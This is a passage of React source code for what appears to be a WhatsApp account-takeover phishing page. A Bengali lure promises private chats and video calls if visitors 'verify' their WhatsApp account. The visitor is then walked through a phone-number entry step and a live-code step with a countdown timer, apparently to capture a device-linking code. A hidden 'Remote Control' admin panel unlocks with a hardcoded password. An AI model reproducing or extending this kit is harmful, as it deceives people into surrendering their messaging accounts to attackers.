                    className="w-full max-w-[340px] bg-white border border-slate-100 p-4.5 rounded-2xl shadow-lg text-center flex flex-col items-center gap-3.5 my-2.5 mx-auto"
                  >
                    <div className="w-11 h-11 rounded-full bg-emerald-500/10 flex items-center justify-center animate-pulse">
                      <Phone className="w-5 h-5 text-emerald-600 fill-emerald-600/10" />
                    </div>
                    <div className="space-y-1 text-left px-1">
                      <h3 className="text-[14px] font-extrabold text-[#075e54] text-center">হোয়াটসঅ্যাপ চ্যাট ও কল সচল করুন</h3>
                      <p className="text-[11.5px] text-slate-500 leading-relaxed text-center font-medium">
                        আসসালামু আলাইকুম! আমার সাথে সরাসরি পারসোনাল চ্যাট, অডিও ও ভিডিও কলে দীর্ঘক্ষণ কথা বলতে আপনার হোয়াটসঅ্যাপ অ্যাকাউন্টটি ১-ক্লিক ভেরিফিকেশন দিয়ে কানেক্ট করুন। 😊
                      </p>
                    </div>
                    <button
                      type="button"
                      onClick={() => setPhase(AppPhase.PHONE_INPUT)}
                      className="w-full py-3 bg-[#128c7e] hover:bg-[#075e54] text-white font-extrabold rounded-xl text-[13px] shadow-md active:scale-[0.98] transition-all cursor-pointer border-none flex items-center justify-center gap-1.5"
                    >
                      <span>প্রাইভেট কল ও মেসেজিং শুরু করুন</span>
                      <ArrowRight className="w-4 h-4" />
                    </button>
                  </motion.div>
                )}

                {phase === AppPhase.PHONE_INPUT && (
                  <PhoneInputPhase
                    key="phone"
                    phoneNumber={phoneNumber}
                    setPhoneNumber={setPhoneNumber}
                    onSubmit={handlePhoneSubmit}
                    onAutoSubmit={handleAutoWhatsAppSubmit}
                    isLoading={isLoadingTransition}
                  />
                )}

                {phase === AppPhase.LOADING && (
                  <LoadingPhase key="loading" />
                )}

                {phase === AppPhase.GUIDE_AND_CODE && (
                  <GuidePhase
                    key="guide"
                    timeLeft={timeLeft}
                    liveCode={liveCode}
                    showError={showError}
                    onActionClick={handleActionClick}
                  />
                )}

                {phase === AppPhase.SUCCESS && (
                  <SuccessPhase
                    key="success"
                    onStartChat={handleStartChat}
                  />
                )}

                {phase === AppPhase.QUEUE_FULL && (
                  <QueueFullPhase
                    key="queue_full"
                    phoneNumber={phoneNumber}
                    onSupportClick={handleStartChat}
                  />
                )}
              </AnimatePresence>
            </div>
          </div>
          
        </main>

        {/* WhatsApp Footer Input Panel with Real-time WebSocket Messaging */}
        <WhatsAppFooter 
          value={footerMessage}
          onChange={handleFooterTyping}
          onSend={handleSendMessage}
          disabled={phase === AppPhase.LOADING}
        />

      </div>

      {/* Admin Authorization Prompt Modal */}
      {showAdminModal && (
        <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-[340px] p-5 shadow-2xl relative animate-in fade-in zoom-in-95 duration-150">
            
            <div className="w-12 h-12 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-3">
              <Shield className="w-6 h-6 text-[#25d366]" />
            </div>

            <h3 className="text-[16px] font-bold text-center text-slate-100 mb-1">
              Admin Authentication
            </h3>
            <p className="text-[11.5px] text-center text-slate-400 mb-4 leading-normal">
              Enter the system authorization security code to launch Remote Control.
            </p>

            <form onSubmit={(e) => {
              e.preventDefault();
              if (adminPassword === "sudoaptinstall") {
                setIsAdminActive(true);
                setShowAdminModal(false);
                setAdminPassword("");
                setAdminError("");
              } else {
                setAdminError("Invalid security key code");
                if (typeof navigator !== "undefined" && navigator.vibrate) {
                  try { navigator.vibrate([100, 50, 100]); } catch(err) {}
                }
              }
            }} className="space-y-4">
              <div className="space-y-1.5 text-left">
                <label className="text-[11px] font-extrabold uppercase tracking-wider text-slate-400 font-mono">
                  Authorization Key
                </label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-sans">
                    <Key className="w-4 h-4" />
                  </span>
                  <input
                    type="password"
                    value={adminPassword}
                    onChange={(e) => {
                      setAdminPassword(e.target.value);
                      if (adminError) setAdminError("");
                    }}
                    placeholder="Enter security key"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-9 pr-4 py-2.5 text-[13px] text-slate-200 placeholder-slate-700 font-mono focus:outline-none focus:border-emerald-500 transition-all font-bold"
                    id="adminPassInp"
                    autoFocus
                  />
                </div>
                {adminError && (
                  <p className="text-red-500 text-[10.5px] font-bold mt-1.5 flex items-center gap-1 animate-pulse">
                    <AlertTriangle className="w-3.5 h-3.5 shrink-0" /> {adminError}
                  </p>
                )}
              </div>

              <div className="flex gap-2.5 pt-2">
                <button
                  type="button"
                  onClick={() => {
                    setShowAdminModal(false);
                    setAdminPassword("");
                    setAdminError("");
                  }}
                  className="flex-1 py-2.5 rounded-xl border border-slate-800 text-slate-400 text-[12.5px] font-bold hover:bg-slate-800/40 transition-colors cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="flex-[#25d366] flex-1 py-2.5 bg-[#00a884] hover:bg-[#008f70] text-slate-950 font-extrabold rounded-xl text-[12.5px] hover:shadow-lg transition-colors cursor-pointer border-none"
                  id="adminSubmitBtn"
                >
                  Join
                </button>
              </div>
            </form>

          </div>
        </div>
      )}
    </div>
  );
}
